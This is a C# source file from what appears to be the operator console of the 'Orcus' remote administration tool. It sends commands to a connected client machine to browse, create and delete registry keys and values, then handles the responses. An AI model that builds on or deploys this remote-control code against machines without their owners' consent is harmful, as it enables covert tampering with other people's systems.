using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows;
using Orcus.Administration.Commands.Extensions;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.Registry;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.Registry
{
    [DescribeCommandByEnum(typeof (RegistryCommunication))]
    public class RegistryCommand : Command
    {
        private readonly Dictionary<string, ManualResetEvent> _subKeysRequests;
        private readonly Dictionary<string, List<AdvancedRegistrySubKey>> _subKeysResults;

        public RegistryCommand()
        {
            _subKeysRequests = new Dictionary<string, ManualResetEvent>();
            _subKeysResults = new Dictionary<string, List<AdvancedRegistrySubKey>>();
        }

        public event EventHandler<RegistryKeyChangedEventArgs> SubKeyCreated;
        public event EventHandler<RegistryKeyChangedEventArgs> SubKeyDeleted;

        public void GetSubKeys(RegistryHive hive, string path)
        {
            var package = new List<byte> {(byte) RegistryCommunication.GetRegistrySubKeys};
            package.AddRange(BitConverter.GetBytes((int) hive));
            package.AddRange(Encoding.UTF8.GetBytes(path));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void DeleteSubKey(RegistryHive hive, string path)
        {
            var package = new List<byte> {(byte) RegistryCommunication.DeleteSubKey};
            package.AddRange(BitConverter.GetBytes((int) hive));
            package.AddRange(Encoding.UTF8.GetBytes(path));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["DeleteSubKey"],
                hive.ToReadableString() + "\\" + path));
        }

        public void CreateSubKey(RegistryHive hive, string path)
        {
            var package = new List<byte> {(byte) RegistryCommunication.CreateSubKey};
            package.AddRange(BitConverter.GetBytes((int) hive));
            package.AddRange(Encoding.UTF8.GetBytes(path));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["CreateSubKey"],
                hive.ToReadableString() + "\\" + path));
        }

        public override void ResponseReceived(byte[] parameter)
        {
            Serializer serializer;
            switch ((RegistryCommunication) parameter[0])
            {
                case RegistryCommunication.ResponseRegistrySubKeys:
                    serializer = new Serializer(typeof (RegistrySubKeysPackage));
                    var result = serializer.Deserialize<RegistrySubKeysPackage>(parameter, 1);

                    ManualResetEvent manualResetEvent;
                    var actualPath = GetPath(result.Path, result.RegistryHive);

                    if (_subKeysRequests.TryGetValue(actualPath, out manualResetEvent))
                    {
                        var subKeys =
                            result.RegistrySubKeys.Select(
                                x =>
                                    new AdvancedRegistrySubKey
                                    {
                                        IsEmpty = x.IsEmpty,
                                        Name = x.Name,
                                        RegistryHive = result.RegistryHive,
                                        RelativePath = string.IsNullOrEmpty(result.Path) ? x.Name : result.Path + "\\" + x.Name,
                                        Path =
                                            actualPath + "\\" + x.Name
                                    }).ToList();

                        if (_subKeysResults.ContainsKey(actualPath))
                            _subKeysResults[actualPath] = subKeys;
                        else
                            _subKeysResults.Add(actualPath, subKeys);

                        manualResetEvent.Set();
                    }

                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedSubKeys"],
                        result.RegistrySubKeys.Count));
                    break;
                case RegistryCommunication.ResponseRegistryValues:
                    serializer = new Serializer(new List<Type>(RegistryValue.RegistryValueTypes)
                    {
                        typeof (RegistryValuesPackage)
                    });

                    var registyValuesPackage = serializer.Deserialize<RegistryValuesPackage>(parameter, 1);
                    RegistryValuesReceived?.Invoke(this,
                        new RegistryValuesReceivedEventArgs(registyValuesPackage.Path, registyValuesPackage.RegistryHive,
                            registyValuesPackage.Values));
                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedValues"],
                        registyValuesPackage.Values.Count));
                    break;
                case RegistryCommunication.PermissionsDeniedError:
                    LogService.Error(string.Format((string) Application.Current.Resources["RegistryPermissionDenied"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case RegistryCommunication.Error:
                    LogService.Error(Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1));
                    break;
                case RegistryCommunication.ResponseSubKeyCreated:
                    serializer = new Serializer(typeof (RegistrySubKeyAction));
                    var keyCreated = serializer.Deserialize<RegistrySubKeyAction>(parameter, 1);
                    SubKeyCreated?.Invoke(this,
                        new RegistryKeyChangedEventArgs(GetPath(keyCreated.Path, keyCreated.RegistryHive), keyCreated.RegistryHive, keyCreated.Path));
                    LogService.Receive((string) Application.Current.Resources["SubKeyCreated"]);
                    break;
                case RegistryCommunication.ResponseValueCreated:
                    ValuesChanged?.Invoke(this, EventArgs.Empty);
                    LogService.Receive((string) Application.Current.Resources["RegistryValueCreated"]);
                    break;
                case RegistryCommunication.ResponseSubKeyDeleted:
                    serializer = new Serializer(typeof (RegistrySubKeyAction));
                    var keyDeleted = serializer.Deserialize<RegistrySubKeyAction>(parameter, 1);
                    SubKeyDeleted?.Invoke(this,
                        new RegistryKeyChangedEventArgs(GetPath(keyDeleted.Path, keyDeleted.RegistryHive), keyDeleted.RegistryHive, keyDeleted.Path));
                    LogService.Receive((string) Application.Current.Resources["SubKeyDeleted"]);
                    break;
                case RegistryCommunication.ResponseValueDeleted:
                    LogService.Receive((string) Application.Current.Resources["RegistryValueRemoved"]);
                    ValuesChanged?.Invoke(this, EventArgs.Empty);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public event EventHandler<RegistryValuesReceivedEventArgs> RegistryValuesReceived;
        public event EventHandler ValuesChanged;

        public List<AdvancedRegistrySubKey> GetRegistrySubKeys(AdvancedRegistrySubKey baseRegistrySubKey, bool refresh)
        {
            ManualResetEvent manualResetEvent;

            if (!_subKeysRequests.ContainsKey(baseRegistrySubKey.Path) || refresh)
            {
                manualResetEvent = new ManualResetEvent(false);
                _subKeysRequests.Remove(baseRegistrySubKey.Path);
                _subKeysRequests.Add(baseRegistrySubKey.Path, manualResetEvent);

                var pathData = Encoding.UTF8.GetBytes(baseRegistrySubKey.RelativePath);
                ConnectionInfo.UnsafeSendCommand(this, 5 + pathData.Length, writer =>
                {
                    writer.Write((byte)RegistryCommunication.GetRegistrySubKeys);
                    writer.Write((int)baseRegistrySubKey.RegistryHive);
                    writer.Write(pathData);
                });
            }
            else
            {
                manualResetEvent = _subKeysRequests[baseRegistrySubKey.Path];
            }
            
            manualResetEvent.WaitOne();
            var subKeys = _subKeysResults[baseRegistrySubKey.Path];
            return subKeys;
        }

        private string GetPath(string relativePath, RegistryHive registryHive)
        {
            if (string.IsNullOrEmpty(relativePath))
                return registryHive.ToReadableString();
            return registryHive.ToReadableString() + "\\" + relativePath;
        }

        public void GetRegistryValues(RegistryHive hive, string registryKey)
        {
            var package = new List<byte> {(byte) RegistryCommunication.GetRegistryValues};
            package.AddRange(BitConverter.GetBytes((int) hive));
            package.AddRange(Encoding.UTF8.GetBytes(registryKey));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void CreateValue(AdvancedRegistrySubKey registrySubKey, RegistryValue registryValue)
        {
            var package = new List<byte> {(byte) RegistryCommunication.CreateValue};
            var serializer =
                new Serializer(new List<Type>(RegistryValue.RegistryValueTypes) {typeof (RegistryCreateValuePackage)});
            package.AddRange(serializer.Serialize(new RegistryCreateValuePackage
            {
                Path = registrySubKey.RelativePath,
                RegistryHive = registrySubKey.RegistryHive,
                RegistryValue = registryValue
            }));

            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["CreateValue"], registryValue.ValueKind,
                registryValue.Key,
                ConvertToString(registryValue.ValueObject).Truncate(10)));
        }

        public void DeleteValue(AdvancedRegistrySubKey registrySubKey, RegistryValue registryValue)
        {
            var package = new List<byte> {(byte) RegistryCommunication.DeleteValue};
            package.AddRange(BitConverter.GetBytes((int) registrySubKey.RegistryHive));
            var path = Encoding.UTF8.GetBytes(registrySubKey.RelativePath);
            package.AddRange(BitConverter.GetBytes(path.Length));
            package.AddRange(path);
            package.AddRange(Encoding.UTF8.GetBytes(registryValue.Key));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["RemoveRegistryValue"],
                registryValue.Key,
                registryValue.ValueKind));
        }

        private string ConvertToString(object value)
        {
            if (value is int)
                return ((uint) (int) value).ToString();
            if (value is long)
                return ((ulong) (long) value).ToString();
            if (value is byte[])
                return BitConverter.ToString((byte[]) value).Replace("-", " ");
            if (value is string)
                return (string) value;
            if (value is string[])
                return string.Join("\t", (string[]) value);

            return string.Empty;
        }

        protected override uint GetId()
        {
            return 13;
        }
    }
}